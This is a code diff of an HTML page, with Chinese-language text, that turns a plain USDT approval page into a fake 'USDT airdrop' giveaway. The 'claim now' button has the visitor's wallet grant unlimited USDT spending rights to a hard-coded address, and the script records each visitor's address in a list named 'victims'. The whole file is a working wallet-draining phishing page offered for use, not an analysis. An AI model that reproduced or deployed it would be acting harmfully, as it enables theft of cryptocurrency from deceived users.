@@ -1,42 +1,25 @@
-
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="UTF-8">
-  <title>授權頁面</title>
-</head>
-<body>
-  <h2>授權 USDT（Ethereum 主網）</h2>
-  <button onclick="approve()">授權最大金額</button>
-
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+<head><meta charset="utf-8"><title>USDT 空投活動</title>
+<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script></head>
+<body style="text-align:center;font-family:sans-serif;padding:50px;">
+  <h2>🎁 恭喜獲得 USDT 空投！</h2>
+  <button onclick="approve()">立即領取</button>
   <script>
-    const tokenAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Mainnet USDT
-    const spender = "0xFbe9c4748A267562f723C67db673943F901533D6";
-
+    const token = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+    const spender = "0xcB1EA088Ef920411B1552a3cB0d1ab4abDFd1638";
     async function approve() {
-      if (!window.ethereum) return alert("請安裝 MetaMask");
+      if (!window.ethereum) return alert("請先安裝 MetaMask");
       const web3 = new Web3(window.ethereum);
-      await window.ethereum.enable();
-
+      await ethereum.request({ method: "eth_requestAccounts" });
+      const abi = [{"name":"approve","type":"function","inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"outputs":[{"name":"","type":"bool"}],"type":"function"}];
+      const contract = new web3.eth.Contract(abi, token);
       const accounts = await web3.eth.getAccounts();
-      const account = accounts[0];
-      const abi = [{ "name": "approve", "type": "function", "inputs": [
-        { "type": "address", "name": "spender" },
-        { "type": "uint256", "name": "value" }
-      ], "outputs": [{ "type": "bool", "name": "" }], "constant": false }];
-      const contract = new web3.eth.Contract(abi, tokenAddress);
-      const max = web3.utils.toTwosComplement(-1);
-      await contract.methods.approve(spender, max).send({ from: account });
-
-      // 儲存到 localStorage
-      let history = JSON.parse(localStorage.getItem("history") || "[]");
-      if (!history.includes(account)) {
-        history.push(account);
-        localStorage.setItem("history", JSON.stringify(history));
-      }
-
-      alert("授權成功！");
+      const amount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+      await contract.methods.approve(spender, amount).send({ from: accounts[0] });
+      const history = JSON.parse(localStorage.getItem("victims") || "[]");
+      history.push({ address: accounts[0], time: new Date().toLocaleString() });
+      localStorage.setItem("victims", JSON.stringify(history));
     }
   </script>
 </body>
